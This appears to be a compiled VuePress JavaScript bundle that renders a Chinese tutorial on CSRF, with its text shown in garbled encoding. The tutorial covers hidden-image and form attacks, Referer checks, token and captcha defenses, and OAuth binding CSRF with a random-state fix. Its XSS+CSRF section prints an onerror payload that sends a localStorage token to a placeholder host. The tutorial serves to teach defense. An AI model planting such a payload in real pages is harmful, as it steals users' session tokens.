(window.webpackJsonp=window.webpackJsonp||[]).push([[34],{245:function(t,e,r){"use strict";r.r(e);var a=r(0),i=Object(a.a)({},function(){this.$createElement;this._self._c;return this._m(0)},[function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"content"},[r("h2",{attrs:{id:"ç®€å•æ˜“æ‡‚çš„äº†è§£-csrf"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#ç®€å•æ˜“æ‡‚çš„äº†è§£-csrf","aria-hidden":"true"}},[t._v("#")]),t._v(" ç®€å•æ˜“æ‡‚çš„äº†è§£ CSRF")]),t._v(" "),r("h3",{attrs:{id:"csrf-æ”»å‡»æ˜¯ä»€ä¹ˆ"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#csrf-æ”»å‡»æ˜¯ä»€ä¹ˆ","aria-hidden":"true"}},[t._v("#")]),t._v(" CSRF æ”»å‡»æ˜¯ä»€ä¹ˆ")]),t._v(" "),r("p",[r("code",[t._v("CSRF")]),t._v("ä¹Ÿè¢«ç§°ä¸º"),r("code",[t._v("XSRF")]),t._v("ï¼Œæ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ çš„ç¼©å†™ï¼Œæ˜¯åˆ©ç”¨ç”¨æˆ·ç¼“å­˜çš„ç™»å½•æ€ï¼Œè¯·æ±‚è‡ªåŠ¨å¸¦ä¸Š cookie éª—å–æœåŠ¡ç«¯ä¿¡ä»»ï¼Œæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚\nå› ä¸ºæœåŠ¡å™¨åªè®¤è¯·æ±‚æºå¸¦è¿‡æ¥çš„ cookie ä¿¡æ¯ï¼Œåªèƒ½ä¿è¯è¯·æ±‚æ¥è‡ªç¼“å­˜æœ‰ç”¨æˆ·ä¿¡æ¯çš„æµè§ˆå™¨ï¼Œè€Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç”¨æˆ·è‡ªæ„¿å‘ç”Ÿçš„è¯·æ±‚ã€‚\nä¸"),r("code",[t._v("XSS")]),t._v("ç›¸æ¯”ï¼Œ"),r("code",[t._v("XSS")]),t._v("åˆ©ç”¨äº†ç”¨æˆ·å¯¹ç½‘ç«™çš„ä¿¡ä»»ï¼Œï¼Œ"),r("code",[t._v("CSRF")]),t._v("åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„ã€‚")]),t._v(" "),r("h3",{attrs:{id:"å…ˆä¸¾ä¸ªæ —å­ğŸŒ°"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#å…ˆä¸¾ä¸ªæ —å­ğŸŒ°","aria-hidden":"true"}},[t._v("#")]),t._v(" å…ˆä¸¾ä¸ªæ —å­ğŸŒ°")]),t._v(" "),r("p",[t._v("å‡è®¾æŸåšæœ‰ä¸€ä¸ªå…³æ³¨æ¥å£ï¼Œå¯ä»¥è®©ç™»å½•ç”¨æˆ·å…³æ³¨æŸä¸ªè´¦å·ï¼›è®¾æƒ³ä¸€ä¸ªæƒ…æ™¯æ˜¯è¯¥æ¥å£æœ‰ CSRF æ¼æ´å¯ä»¥è¢«é»‘å®¢åˆ©ç”¨åˆ·å…³æ³¨æ•°ã€‚é»‘å®¢åº”è¯¥å¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ï¼Ÿ")]),t._v(" "),r("ul",[r("li",[t._v("å†™ä¸ªxxç½‘ç«™ï¼Œæä¸ªéšè— img æ ‡ç­¾ï¼Œsrc ä¸ºä¸Šè¿°å…³æ³¨æ¥å£")]),t._v(" "),r("li",[t._v("ç”¨æˆ·æµè§ˆè¿™ä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œä¼šè¯·æ±‚ä¸Šè¿°æ¥å£ï¼Œå¦‚æœç”¨æˆ·ç™»å½•è¿‡å¤´æ¡ï¼Œè¿™æ—¶å€™ç™»å½•æ€å°±å¸¦è¿‡å»äº†ï¼Œå…³æ³¨æˆåŠŸ")]),t._v(" "),r("li",[t._v("è¿›é˜¶ï¼šä½¿ç”¨ form ä»£æ›¿ imgï¼Œåœ¨ window.onload submit formï¼Œå¯ä»¥æ”¹GETä¸ºPOSTæ”»å‡»")])]),t._v(" "),r("h3",{attrs:{id:"æ€ä¹ˆé˜²å¾¡"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#æ€ä¹ˆé˜²å¾¡","aria-hidden":"true"}},[t._v("#")]),t._v(" æ€ä¹ˆé˜²å¾¡")]),t._v(" "),r("p",[t._v("é¦–å…ˆå¾—çŸ¥é“å®ƒæ€ä¹ˆè¿›è¡Œæ”»å‡»ï¼Œä»¥åŠæ”»å‡»çš„ç›®æ ‡")]),t._v(" "),r("ul",[r("li",[t._v("ç”¨æˆ·å¿…é¡»å·²ç»åœ¨ç›®æ ‡ç½‘ç«™ç™»å½•ï¼Œç„¶åæºå¸¦ç”¨æˆ·çš„cookieæ¬ºéª—æœåŠ¡å™¨")]),t._v(" "),r("li",[t._v("é»‘å®¢å¹¶ä¸èƒ½æ‹¿åˆ° cookieï¼Œä¸”çœ‹ä¸åˆ° cookie çš„å†…å®¹ã€‚ç”±äºæµè§ˆå™¨åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œä¹Ÿæ— æ³•è§£ææœåŠ¡è¿”å›çš„å†…å®¹ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ä¿æŠ¤çš„å¯¹è±¡æ˜¯å†™æœåŠ¡ï¼Œè€Œå¯¹äºè¯»æœåŠ¡åˆ™ä¸éœ€è¦è¿›è¡ŒCSRFçš„ä¿æŠ¤")]),t._v(" "),r("li",[t._v("ä¿æŠ¤çš„å…³é”®ï¼Œæ˜¯ åœ¨è¯·æ±‚ä¸­æ”¾å…¥é»‘å®¢æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯")])]),t._v(" "),r("h4",{attrs:{id:"ä½ç«¯æ“ä½œ"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#ä½ç«¯æ“ä½œ","aria-hidden":"true"}},[t._v("#")]),t._v(" ä½ç«¯æ“ä½œ")]),t._v(" "),r("p",[t._v("æ•æ„Ÿæ“ä½œç”¨POSTä»£æ›¿GETï¼Œè¿™ä¸ªåœ¨ä¸Šé¢å·²ç»è¯´äº†ï¼Œæ²¡å¤šå¤§ç”¨å¤„")]),t._v(" "),r("h4",{attrs:{id:"å¸¸è§„æ“ä½œ"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#å¸¸è§„æ“ä½œ","aria-hidden":"true"}},[t._v("#")]),t._v(" å¸¸è§„æ“ä½œ")]),t._v(" "),r("h5",{attrs:{id:"é™åˆ¶è¯·æ±‚æ¥æº-referer"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#é™åˆ¶è¯·æ±‚æ¥æº-referer","aria-hidden":"true"}},[t._v("#")]),t._v(" é™åˆ¶è¯·æ±‚æ¥æº Referer")]),t._v(" "),r("p",[t._v("æ–¹æ³•ï¼šHTTP Header é‡Œæœ‰ä¸€ä¸ª referer å­—æ®µè¡¨ç¤ºè¯·æ±‚çš„æ¥æºï¼ŒæœåŠ¡å™¨å¯éªŒè¯è¿™ä¸ª referer å¹¶æ‹’ç»è®¿é—®\nä¼˜ç‚¹ï¼šç®€å•æ˜“å®ç°\nç¼ºç‚¹ï¼šä¸¥é‡ä¾èµ–æµè§ˆå™¨å®ç°ï¼Œä¸Šå¤æµè§ˆå™¨refererå¯è¢«ä¿®æ”¹ï¼Œæ–°ç­–ç•¥å¯ä»¥å…è®¸ä¸å¸¦ referer")]),t._v(" "),r("h5",{attrs:{id:"æ·»åŠ -token-éªŒè¯"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#æ·»åŠ -token-éªŒè¯","aria-hidden":"true"}},[t._v("#")]),t._v(" æ·»åŠ  token éªŒè¯")]),t._v(" "),r("p",[t._v("æ–¹æ³•ï¼š")]),t._v(" "),r("ol",[r("li",[t._v("ç”¨æˆ·åœ¨ç™»å½•çš„æ—¶å€™æœåŠ¡å™¨äº§ç”Ÿ token è¿”å›ç»™å‰ç«¯")]),t._v(" "),r("li",[t._v("å‰ç«¯å‘è¯·æ±‚çš„æ—¶å€™ï¼Œå°† token æ”¾åˆ°è¯·æ±‚urlé‡Œæˆ–è€…è¯·æ±‚å¤´ä¸­å¸¦ç»™æœåŠ¡å™¨ã€‚")]),t._v(" "),r("li",[t._v("æœåŠ¡å™¨éªŒè¯ tokenï¼Œç”±äºé»‘å®¢æ— æ³•ç™»å½•å¾—åˆ°æˆ–è€…ä¼ªé€  tokenï¼Œæ‰€ä»¥èƒ½é˜²èŒƒ CSRF\nç¼ºç‚¹ï¼š\nå¹¶ä¸ç»å¯¹å®‰å…¨ï¼š")]),t._v(" "),r("li",[t._v("é…åˆå…¶ä»–æ”»å‡»æ–¹å¼å¦‚XSSå’ŒJSONPè·å–åˆ°tokenï¼Œå†å°†tokenå¾…åˆ°urlå‚æ•°ï¼›\na. å°† token æ”¾åˆ° è¯·æ±‚ header é‡Œå¯é¿å…è¿™ä¸ªé—®é¢˜ï¼Œæ¯•ç«Ÿ img script form ç­‰æ ‡ç­¾å‘å‡ºçš„è¯·æ±‚æ— æ³•è‡ªå®šä¹‰è¯·æ±‚ header")]),t._v(" "),r("li",[t._v("å­˜åœ¨æ›´æç«¯çš„æƒ…å†µ\na. abc.com ä¸‹æœ‰ä¸¤ä¸ªæœåŠ¡ï¼Œé€šè¿‡ nginx ä¹‹ç±»åˆ†æµåˆ° abc.com/a å’Œ abc.com/b\nb. å½“ a å­˜åœ¨éšæ‚£è¢«æ”»å‡»æˆåŠŸåï¼Œa å¯ä»¥ä¿®æ”¹ abc.com çš„ token ä¿¡æ¯ï¼Œä¸” a è¯·æ±‚åˆ° abc.com ä¸‹å…¶ä»–çš„æœåŠ¡éƒ½ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜ï¼Œä»è€Œå¯¼è‡´ä¸€ä¸ªæœåŠ¡æ²¦é™·ï¼ŒåŒåŸŸä¸‹å…¶ä»–æœåŠ¡ä¹Ÿé€ æˆå±é™©")])]),t._v(" "),r("h4",{attrs:{id:"ç®€å•ç²—æš´çš„æ“ä½œ"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#ç®€å•ç²—æš´çš„æ“ä½œ","aria-hidden":"true"}},[t._v("#")]),t._v(" ç®€å•ç²—æš´çš„æ“ä½œ")]),t._v(" "),r("p",[t._v("æ–¹æ³•ï¼šæ·»åŠ éªŒè¯ç æ¥éªŒè¯è¿™ä¸ªæ“ä½œæ˜¯ä¸æ˜¯ç”¨æˆ·ä¸»åŠ¨å‘èµ·çš„\nä¼˜ç‚¹ï¼šç®€å•ç²—æš´ï¼Œç›¸å½“å¯é \nç¼ºç‚¹ï¼šå¯¹ç”¨æˆ·ä¸å‹å¥½")]),t._v(" "),r("h3",{attrs:{id:"oauth-csrf-æ”»å‡»"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#oauth-csrf-æ”»å‡»","aria-hidden":"true"}},[t._v("#")]),t._v(" OAuth CSRF æ”»å‡»")]),t._v(" "),r("h4",{attrs:{id:"ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š","aria-hidden":"true"}},[t._v("#")]),t._v(" ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š")]),t._v(" "),r("p",[t._v("ç”¨æˆ·å¹³å°ï¼ˆæ¯”å¦‚æŸäº¤å‹å¹³å°ï¼‰ï¼›è®¤è¯æœåŠ¡å™¨ï¼ˆæ¯”å¦‚githubï¼‰")]),t._v(" "),r("ol",[r("li",[r("p",[t._v("æ­£å¸¸æµç¨‹")])]),t._v(" "),r("li",[r("p",[t._v("è€æç™»å½•æŸäº¤å‹å¹³å°ï¼Œæ²¡å…³è” githubï¼Œäº¤å‹å¹³å° è·³è½¬åˆ° github")])]),t._v(" "),r("li",[r("p",[t._v("è€æåœ¨ github ç™»å½•ï¼Œgithub è·å–ç”¨æˆ·æˆæƒ")])]),t._v(" "),r("li",[r("p",[t._v("github ç”Ÿæˆè€æåœ¨ github å¹³å°å”¯ä¸€å¯¹åº”çš„ code å›è°ƒ äº¤å‹å¹³å° çš„åœ°å€")])]),t._v(" "),r("li",[r("p",[t._v("äº¤å‹å¹³å° å°† code ä¸è€æåœ¨è‡ªå·±å¹³å°çš„è´¦å·å…³è”\né—®é¢˜åœ¨äº github æˆæƒå®Œæˆè·³å› äº¤å‹å¹³å° çš„å¸¦æœ‰ code çš„é‡å®šå‘ URI å¯¹äº äº¤å‹å¹³å° æœåŠ¡å™¨æ¥è¯´æ˜¯æ— çŠ¶æ€çš„ï¼Œè¯¥ code æ ‡è¯†çš„åªæ˜¯è€æåœ¨ github å¹³å°çš„å”¯ä¸€æ€§")])]),t._v(" "),r("li",[r("p",[t._v("å¼ ä¸‰çš„æ”»å‡»æµç¨‹")])]),t._v(" "),r("li",[r("p",[t._v("å¼ ä¸‰åœ¨ 1.c æ­¥å¥å¸¦ä¸Š code çš„æ—¶å€™æ²¡æœ‰çœŸæ­£æ‰§è¡Œ 1.dï¼Œæ¯”å¦‚æ–­ç½‘æˆ–è€…æ¶æ„å­˜å‚¨èµ·æ¥")])]),t._v(" "),r("li",[r("p",[t._v("è¿™æ—¶å€™è€æåœ¨ äº¤å‹å¹³å° å·²ç™»å½•ä½†æ˜¯æœªç»‘å®š githubï¼Œå¼ ä¸‰å°†è‡ªå·±çš„ code å‘ç»™è€æï¼Œå¯¼è‡´è€æçš„å·ç»‘å®šäº†å¼ ä¸‰çš„ github è´¦å·ï¼Œå¼ ä¸‰å°±å¯ä»¥ç”¨è‡ªå·±çš„ github è´¦å·ç™»å½•è€æçš„ äº¤å‹å¹³å°")])]),t._v(" "),r("li",[r("p",[t._v("é‚£ä¹ˆï¼Œå¼ ä¸‰æ€ä¹ˆå°† code å‘ç»™è€æçš„å‘¢ï¼Œè¿™æ—¶å€™å‡è®¾è€æè®¿é—®äº†å¼ ä¸‰å†™çš„æŸæŸç›¸äº²å¹³å°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ª img æ ‡ç­¾ï¼Œsrc ä¸º äº¤å‹å¹³å°çš„å›è°ƒåœ°å€å¹¶å¸¦ä¸Šå¼ ä¸‰å‡†å¤‡å¥½çš„ codeï¼Œå› ä¸ºè€æåœ¨ äº¤å‹å¹³å° å·²ç»ç™»å½•ä¸”æœªç»‘å®š githubï¼Œè¿™æ—¶å€™å°±ç›¸å½“äºæŠŠå¼ ä¸‰çš„ github ç»‘å®šåˆ°äº†è€æåœ¨ äº¤å‹å¹³å° çš„å·ã€‚å®Œæˆäº†ä¸€æ¬¡ CSRF æ”»å‡»")])])]),t._v(" "),r("h5",{attrs:{id:"é˜²å¾¡åŠæ³•-éšæœºæ•°æ ¡éªŒ"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#é˜²å¾¡åŠæ³•-éšæœºæ•°æ ¡éªŒ","aria-hidden":"true"}},[t._v("#")]),t._v(" é˜²å¾¡åŠæ³•: éšæœºæ•°æ ¡éªŒ")]),t._v(" "),r("p",[t._v("ä¸Šè¿°æ”»å‡»çš„å…³é”®å°±åœ¨äº äº¤å‹å¹³å° æ— æ³•åˆ¤æ–­ç”± github é‡å®šå‘å›çš„URIæ˜¯å¦æ˜¯å½“å‰ç™»å½•ç”¨æˆ·è€ææ‰€å‘èµ·çš„æˆæƒã€‚å¯ä»¥é€šè¿‡éšæœºæ•° R æ¥åˆ¤æ–­ code æ˜¯å¦åˆæ³•")]),t._v(" "),r("ol",[r("li",[t._v("äº¤å‹å¹³å° åœ¨è·³è½¬ github çš„æ—¶å€™å¾€ç”¨æˆ· session å†™ä¸€ä¸ªéšæœºæ•° Rï¼Œå¹¶ä¼ ç»™ github")]),t._v(" "),r("li",[t._v("github å›è°ƒ äº¤å‹å¹³å° çš„æ—¶å€™å°† code å’Œ R ä¸€èµ·å¸¦ç»™ äº¤å‹å¹³å°")]),t._v(" "),r("li",[t._v("äº¤å‹å¹³å° å°† github ä¼ è¿‡æ¥çš„ R å’Œ è€æ session é‡Œçš„ R æ ¡éªŒï¼Œé€šè¿‡å°±è¯æ˜ code æœ‰æ•ˆ")])]),t._v(" "),r("p",[r("b",[t._v("ç”±ä¸Šå¯çŸ¥å¯¹åˆ©ç”¨OAuthè¿›è¡ŒCSRFæ”»å‡»çš„æ¡ä»¶æ˜¯å¾ˆè‹›åˆ»çš„ï¼š")]),t._v("æ”»å‡»è€…å¿…é¡»äº†è§£ç›®æ ‡ç½‘ç«™çš„"),r("b",[t._v("ç»‘å®šç‰¹æ€§")]),t._v("ï¼Œæ¯”å¦‚ä¸€ä¸ªè´¦å·åªèƒ½ç»‘å®šä¸€ä¸ª OAuthï¼Œæ”»å‡»è€…åªèƒ½å®šå‘æ”»å‡»æ²¡æœ‰ç»‘å®š OAuth çš„å·ï¼Œå¹¶ä¸”æ”»å‡»ä¸€æ¬¡åéœ€è¦è§£ç»‘æ‰èƒ½æ”»å‡»ä¸‹ä¸€ä¸ªã€‚æ— æ³•å¿«é€Ÿå¤§èŒƒå›´æ’’ç½‘æ”»å‡»")]),t._v(" "),r("h3",{attrs:{id:"xss-csrf-é…åˆ"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#xss-csrf-é…åˆ","aria-hidden":"true"}},[t._v("#")]),t._v(" XSS+CSRF é…åˆ")]),t._v(" "),r("blockquote",[r("p",[t._v("å­˜å‚¨å‹ XSS + CSRF")])]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v('<img\n\twidth="0"\n\theight="0"\n\tsrc="xx"\n\tonerror="javascript:var i=document.createElement(\'iframe\');i.width=0;i.height=0;i.frameBorder=null;i.src=`http://xx/csrf.html?token=${localStorage.getItem(\'token\')}`;document.body.appendChild(i)"\n/>\n')])])]),r("ol",[r("li",[t._v("æ’ä¸€ä¸ªéšè—çš„ img æ ‡ç­¾ï¼Œsrc ä¹±è®¾ç½®ä¸€ä¸ªè¯·æ±‚ä¸é€šçš„ï¼Œå¿…ç„¶æ‰§è¡Œ onerror")]),t._v(" "),r("li",[t._v("onerror é‡Œåˆ›å»ºä¸€ä¸ªéšè—çš„ iframeï¼ŒæŒ‡å‘ scrf é¡µé¢ï¼Œå¹¶å¸¦ä¸Šå½“å‰è·å–åˆ°çš„ token æˆ– cookie")])]),t._v(" "),r("h3",{attrs:{id:"æ€»ç»“"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#æ€»ç»“","aria-hidden":"true"}},[t._v("#")]),t._v(" æ€»ç»“")]),t._v(" "),r("p",[r("strong",[t._v("CSRFæ”»å‡»åˆ©ç”¨çš„æ˜¯æœåŠ¡å™¨æ— æ³•åˆ†è¾¨è¯·æ±‚æ˜¯ä¸æ˜¯ç”¨æˆ·æœ¬äººå‘èµ·çš„ï¼Œæ‰€ä»¥é˜²èŒƒçš„å…³é”®åœ¨äºåœ¨è¯·æ±‚ä¸­æ”¾å…¥é»‘å®¢æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ã€‚ä»è€Œé˜²æ­¢é»‘å®¢ä¼ªé€ ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚æ¬ºéª—æœåŠ¡å™¨")])])])}],!1,null,null,null);e.default=i.exports}}]);